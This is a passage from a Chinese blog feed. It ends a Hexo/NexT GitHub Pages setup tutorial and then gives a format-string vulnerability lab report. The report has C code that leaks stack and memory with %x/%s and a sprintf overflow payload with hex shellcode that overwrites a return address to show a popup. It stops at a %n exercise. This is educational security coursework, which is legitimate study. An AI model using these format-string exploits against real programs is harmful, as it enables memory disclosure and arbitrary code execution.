class="string">Doe</span><span class="comment">#网站作者</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span><span class="comment">#网站语言，具体如何表示查看主题文件下的language下的文件</span></span><br><span class="line"><span class="attr">timezone:</span><span class="comment">#网站时区，默认是自己电脑时区</span></span><br></pre></td></tr></table></figure></li><li><p>网址配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://yoursite.com</span><span class="comment">#网站网址</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span><span class="comment">#网站根目录</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span><span class="comment">#文章的永久链接格式</span></span><br><span class="line"><span class="attr">permalink_defaults:</span><span class="comment">#文章的永久链接格式的默认值</span></span><br></pre></td></tr></table></figure></li><li><p>目录配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span><span class="comment">#存放博文</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span><span class="comment">#存放静态网页文件</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span><span class="comment">#标签文件夹</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span><span class="comment">#归档文件夹</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span><span class="comment">#分类文件夹</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span><span class="comment">#Include code文件夹</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span><span class="comment">#i18n(国际化)文件夹</span></span><br><span class="line"><span class="attr">skip_render:</span><span class="comment">#跳过指定文件的渲染</span></span><br></pre></td></tr></table></figure><p>3.文章配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment">#新建博文文件名称</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span><span class="comment">#预设布局</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span><span class="comment">#不将标题每个单词首字母转换成大写</span></span><br><span class="line"><span class="attr">external_link:</span> <span class="literal">true</span><span class="comment">#在新标签中打开链接</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span><span class="comment">#设置文件名称不变(1为小写，2为大写，0为不变)</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span><span class="comment">#不显示草稿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span><span class="comment">#不启动Asset文件夹</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span><span class="comment">#不把链接改为与根目录的相对位址</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span><span class="comment">#显示未来的文章</span></span><br><span class="line"><span class="attr">highlight:</span><span class="comment">#高亮代码设置</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span><span class="comment">#显示行号</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span><span class="comment">#不自动检测</span></span><br><span class="line">  <span class="attr">tab_replace:</span><span class="comment">#将Tab替换成其它字符串</span></span><br></pre></td></tr></table></figure></li><li><p>分类和标签配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span><span class="comment">#默认分类</span></span><br><span class="line"><span class="attr">category_map:</span><span class="comment">#分类别名</span></span><br><span class="line"><span class="attr">tag_map:</span><span class="comment">#标签别名</span></span><br></pre></td></tr></table></figure></li><li><p>时间日期格式</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span></span><br></pre></td></tr></table></figure></li><li><p>分页配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span><span class="comment">#每页显示的文章量为10篇</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span><span class="comment">#分页目录</span></span><br></pre></td></tr></table></figure></li><li><p>主题配置</p><p>默认主题为<code>landscape</code> ，可以从<a href="http://hexo.io/themes/下载其它主题到themes中改变主题；" target="_blank" rel="noopener">http://hexo.io/themes/下载其它主题到themes中改变主题；</a></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br></pre></td></tr></table></figure></li><li><p>部署配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span><span class="string">git</span><span class="comment">#设置发布类型，这里选择git</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到<code>github</code></h1><h2 id="注册github"><a href="#注册github" class="headerlink" title="注册github"></a>注册<code>github</code></h2><p>点击<a href="http://www.github.com进行注册即可" target="_blank" rel="noopener">www.github.com进行注册即可</a></p><h2 id="创建项目目标代码库"><a href="#创建项目目标代码库" class="headerlink" title="创建项目目标代码库"></a>创建项目目标代码库</h2><p>点击<code>New repository</code>，创建新的项目库，项目名称为<code>用户名.github.io</code>，勾选<code>Initialize this respository with a ERADME</code>，点击<code>Creating resporitory</code>，创建新的项目库</p><h2 id="设置SSH密钥"><a href="#设置SSH密钥" class="headerlink" title="设置SSH密钥"></a>设置<code>SSH</code>密钥</h2><ol><li><p>安装插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li><li><p>修改站点配置文件<code>_config.yml</code>，补充<code>deploy</code>信息</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span> </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:github用户名/github用户名.github.io.git</span> </span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>&lt;folder&gt;</code>目录下打开命令行，输入如下命令生成<code>SSH密钥</code>，后续过程直接回车即可；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"email@example.com"</span> </span></span><br><span class="line"> //github注册邮箱地址</span><br></pre></td></tr></table></figure><p>生成的密钥一般会存储在<code>C:\users\用户名\.ssh</code>目录下，密钥存储文件为<code>id_rsa</code>，公钥存储文件为<code>id_rsa.pub</code>。</p></li><li><p>配置github账户</p><p>登录<code>github</code>账户，点击右上角头像，选择<code>Settings</code>，然后点击<code>SSH and GPG Keys</code>，点击<code>New SSH  key</code>，填一个自己喜欢的标题，然后将<code>id_rsa.pub</code>得内容复制粘贴到<code>key</code>中，点击<code>Add SSH key</code>即可完成。</p></li><li><p>测试</p><p>打开命令行，输入如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>之后会显示如下内容，表示<code>ssh</code>密钥配置正确。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure></li><li><p>配置<code>Git</code>个人信息</p><p>本地打开命令行，输入如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name "github用户名"</span><br><span class="line">git config --global user.email  "github邮箱"</span><br></pre></td></tr></table></figure></li></ol><h2 id="生成静态文件并上传"><a href="#生成静态文件并上传" class="headerlink" title="生成静态文件并上传"></a>生成静态文件并上传</h2><p>输入以下命令，在本地生成静态文件，并上传至github</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g#本地生成静态文件</span><br><span class="line">hexo d#将项目上传至github</span><br></pre></td></tr></table></figure><p>此时登录<code>用户名.github.io</code>即可访问自己的个人博客。</p><h1 id="Hexo主题设置"><a href="#Hexo主题设置" class="headerlink" title="Hexo主题设置"></a><code>Hexo</code>主题设置</h1><p>下载<a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">NexT</a>主题，保存至<code>themes</code>目录下，在<code>&lt;folder&gt;</code>目录下更改<code>_config.yml</code>文件<code>theme: landscape</code>为<code>theme: next</code>。</p><h2 id="菜单配置"><a href="#菜单配置" class="headerlink" title="菜单配置"></a>菜单配置</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span><span class="comment">#首页</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span><span class="comment">#分类</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span><span class="comment">#归档</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">tags</span><span class="comment">#标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">user</span><span class="comment">#关于</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">/schedule/</span> <span class="string">||</span> <span class="string">calendar</span><span class="comment">#日志</span></span><br><span class="line">  <span class="attr">sitemap:</span> <span class="string">/sitemap.xml</span> <span class="string">||</span> <span class="string">sitemap</span><span class="comment">#站点导航</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">heartbeat</span><span class="comment">#爱心</span></span><br></pre></td></tr></table></figure><h2 id="内容显示配置"><a href="#内容显示配置" class="headerlink" title="内容显示配置"></a>内容显示配置</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Content</span></span><br><span class="line"><span class="attr">excerpt_link:</span> <span class="string">阅读全文</span><span class="comment">#设置查看全文的按钮显示文本</span></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span>   <span class="comment">#是否开启弹出层效果</span></span><br></pre></td></tr></table></figure><h2 id="侧边栏配置"><a href="#侧边栏配置" class="headerlink" title="侧边栏配置"></a>侧边栏配置</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sidebar</span></span><br><span class="line"><span class="attr">sidebar:</span> <span class="string">right</span>    <span class="comment">#侧边栏展示的方向</span></span><br><span class="line"><span class="attr">widgets:</span>          <span class="comment">#侧边栏添加的组件配置</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">category</span>        <span class="comment">#显示分类</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">tag</span>             <span class="comment">#显示标签</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">tagcloud</span>        <span class="comment">#显示标签云</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">archive</span>         <span class="comment">#显示归档</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">recent_posts</span>    <span class="comment">#显示最近发布</span></span><br></pre></td></tr></table></figure><h1 id="Hexo常用命令"><a href="#Hexo常用命令" class="headerlink" title="Hexo常用命令"></a><code>Hexo</code>常用命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo new "postName" #新建文章</span><br><span class="line">hexo new page "pageName" #新建页面</span><br><span class="line">hexo generate #生成静态页面</span><br><span class="line">hexo server #开启预览访问</span><br><span class="line">hexo deploy #部署到GitHub</span><br><span class="line">hexo help  #查看帮助</span><br><span class="line">hexo version  #查看Hexo的版本</span><br></pre></td></tr></table></figure><p>缩写如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo n == hexo new</span><br><span class="line">hexo g == hexo generate</span><br><span class="line">hexo s == hexo server</span><br><span class="line">hexo d == hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 搭建网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> NexT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化输出 实验报告</title>
      <link href="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>通过<code>%x</code>来查看栈内容；</li><li>通过<code>%s</code>查看指定地址内容；</li><li>对<code>sprintf</code>函数及<code>shellcode</code>做解释分析；</li><li>通过格式化字符串造成的缓冲区溢出覆盖返回地址，执行<code>shellcode</code>。<a id="more"></a></li></ol><h1 id="通过-x来查看栈内容"><a href="#通过-x来查看栈内容" class="headerlink" title="通过%x来查看栈内容"></a>通过<code>%x</code>来查看栈内容</h1><p>通过<code>%x</code>来查看栈内容，重建栈内存，获得该<code>frame</code>的返回地址</p><ol><li><p>程序代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看栈内容</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">char</span> format[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(format,<span class="string">"%08x.%08x.%08x.%08x"</span>);</span><br><span class="line"><span class="built_in">printf</span>(format,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>为了能触发<code>int 3</code> 断点时启动 <code>OllyDbg</code>，设置 <code>OllyDbg</code> 为实时调试器</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922495757.png" alt="1565922495757"></p></li><li><p>运行该程序，自动跳转到<code>OllyDbg</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922513087.png" alt="1565922513087"></p></li><li><p>在<code>printf</code>处，设置断点 </p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922546835.png" alt="1565922546835"></p></li><li><p>当执行到<code>printf</code>处时，查看右下角栈中信息。发现第四个<code>%x</code>没有对应参数，因此会显示本应是参数所在位置的栈内容为<code>0x00132588</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922585516.png" alt="1565922585516"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922594049.png" alt="1565922594049"></p></li><li><p>通过更多<code>%x</code>可以重建大部分栈内存。其原理如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922624354.png" alt="1565922624354"></p></li></ol><h1 id="通过-s查看指定地址内容"><a href="#通过-s查看指定地址内容" class="headerlink" title="通过%s查看指定地址内容"></a>通过<code>%s</code>查看指定地址内容</h1><ol><li><p>程序代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看指定地址的内存内容</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">char</span> format[<span class="number">40</span>];</span><br><span class="line"><span class="comment">//利用多个%x将%s对应的参数位置挪到存储地址77E61044的栈地址</span></span><br><span class="line"><span class="built_in">strcpy</span>(format,<span class="string">"\x44\x10\xE6\x77%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s"</span>);</span><br><span class="line"><span class="comment">//输出地址0x77E61044的内存</span></span><br><span class="line"><span class="built_in">printf</span>(format,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>运行该程序，自动跳转到<code>OllyDbg</code>。在<code>printf</code>处设下断点</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922779419.png" alt="1565922779419"></p></li><li><p>当执行到<code>printf</code>处时，查看右下角栈中信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922798995.png" alt="1565922798995"></p></li><li><p>利用<code>%x</code>步进，将<code>％s</code>的参数对应到<code>0x77E61044</code>，因此可以输出<code>0x77E61044</code>开始的字符串直到遇到截断符。<code>0x0012FF58</code>为<code>format</code>起始地址，前四字节即我们想看的内存地址<code>0x77E61044</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922828370.png" alt="1565922828370"></p></li><li><p>原理如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565922852948.png" alt="1565922852948"></p></li></ol><h1 id="对sprintf函数及shellcode做解释分析"><a href="#对sprintf函数及shellcode做解释分析" class="headerlink" title="对sprintf函数及shellcode做解释分析"></a>对<code>sprintf</code>函数及<code>shellcode</code>做解释分析</h1><ol><li><p>程序代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> user[]=</span><br><span class="line">     <span class="string">"%497d\x39\x4a\x42\x00"</span></span><br><span class="line">     <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">     <span class="string">"\x33\xDB\x53\x68\xC1\xD8\x2D\x2D\x68\xC0\xEE\xD6\xCE\x8B\xC4\x53"</span></span><br><span class="line">     <span class="string">"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">     <span class="string">"\xB8\xBB\xB0\xE7\x77\xFF\xD0\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem</span><span class="params">()</span></span>&#123;</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">char</span> outbuf[<span class="number">512</span>];</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(</span><br><span class="line"><span class="built_in">buffer</span>,</span><br><span class="line">    <span class="string">"ERR Wrong command: %.400s"</span>,</span><br><span class="line">    user</span><br><span class="line">);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">执行完上一步后buffer[]="ERR Wrong command: %497d\x39\x4a\x42\x00"</span></span><br><span class="line"><span class="comment">00424a39为shellcode地址；此处仅仅就是一串&lt;nop&gt;而已</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="built_in">sprintf</span>(outbuf,<span class="built_in">buffer</span>);<span class="comment">//sprintf(outbuf,"ERR Wrong command: %497d\x39\x4a\x42\x00");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line">     mem();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>sprintf()</code>函数分析</p><ul><li><code>buffer</code>指针指向将要写入字符串的缓冲区</li><li><code>format</code>格式化字符串</li><li><code>argument</code>为可选参数</li></ul><p>作为向字符数组中写入数据的格式化输出函数，<code>sprintf()</code>会假定存在任意长度的缓冲区。</p></li><li><p><code>shellcode</code>分析</p><p><code>Char user[ ]</code>字符数组为构造的<code>shellcode</code>，其中有非常规字符<code>%497d</code>，<code>\x39\x4a\x42\x00</code>是<code>shellcode</code>的起始地址，用来覆盖返回地址，后面的内容是<code>buptbupt</code>弹窗的<code>shellcode</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565923227952.png" alt="1565923227952"></p></li></ol><h1 id="缓冲区溢出执行shellcode"><a href="#缓冲区溢出执行shellcode" class="headerlink" title="缓冲区溢出执行shellcode"></a>缓冲区溢出执行<code>shellcode</code></h1><p>通过格式化字符串造成的缓冲区溢出覆盖返回地址，执行<code>shellcode</code></p><ol><li><p>运行该程序，自动跳转到<code>OllyDbg</code></p></li><li><p>第⼀次调用<code>sprintf()</code>时写入数据的目的地址为<code>0x0012FB2C</code>,格式化字符串为<code>ERR Wrong command:%.400s</code>，其中<code>%.400s</code>对应的参数为起始地址为<code>0x00424A30</code>的字符串，即用户输入的字符数组<code>user</code>。对地址<code>0x00424A30</code>数据窗跟随后可以看见该字符数组的内容</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924837549.png" alt="1565924837549"></p></li><li><p>第一次调用<code>printf()</code>函数后可见<code>buffer</code>中的字符串为<code>ERR Wrong command:%497d\x39\x4a\x42\x00</code>，其后数据由于<code>0x00</code>被截断</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924854513.png" alt="1565924854513"></p></li><li><p>第二次调用<code>sprintf()</code>时，时<code>buffer</code>中格式化字符串为：<code>ERR Wrong command:%497d\x39\x4a\x42\x00</code>，根据格式化字符串，<code>sprintf()</code>函数会读取⼀个参数以<code>%497d</code>的格式写⼊<code>outbuf</code>，由于未提供该参数，会⾃动将栈地址<code>0x0012FAE0</code>中的值视为该参数，即<code>0x12FF80</code>, ⼗进制值<code>1245056</code>。需要写⼊<code>outbuf</code>的总字符串长度为<code>19＋497 ＝516</code>，⽽<code>outbuf</code>长度为<code>512</code>，因此会导致栈溢出,使得函数的返回地址<code>0x004010D1</code>被<code>\x39\x4a\x42\x00</code>覆盖</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924877884.png" alt="1565924877884"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924896239.png" alt="1565924896239"></p><p>第二次调用<code>printf()</code>函数后，<code>outbuf</code>中的内容如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924906833.png" alt="1565924906833"></p><p><code>outbuf</code>起始地址为<code>0x0012FD2C</code>, <code>19</code>字节的字符串<code>ERR Wrong command:</code> 后<code>497</code>字节为整型数字<code>1245056</code>，从<code>0x0012FF30</code>开始为<code>\x39\x4a\x42\x00</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924919421.png" alt="1565924919421"></p></li><li><p>程序执行后出现<code>shellcode</code>弹窗</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565925965646.png" alt="1565925965646"></p></li><li><p>原理如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565924779062.png" alt="1565924779062"></p></li></ol><h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        当程序使用的格式字符串由用户或其他非信任来源提供时，有可能出现格式字符串漏洞。攻击者可利用格式化输出函数来检查内存的内容、覆写内存。对一个数据结构进行越界写时可能会导致缓冲区溢出，可以利用缓冲区溢出来执行<code>shellcode</code>。</p><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>破解<code>foo.exe</code>程序，在不改变源代码的情况下，要求通过设置程序调用参数的方式调用该程序中隐藏的<code>foo</code>函数（主要利用<code>%n</code>及<code>%x</code>参数）。</p><ol><li><p>打开源程序分析源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 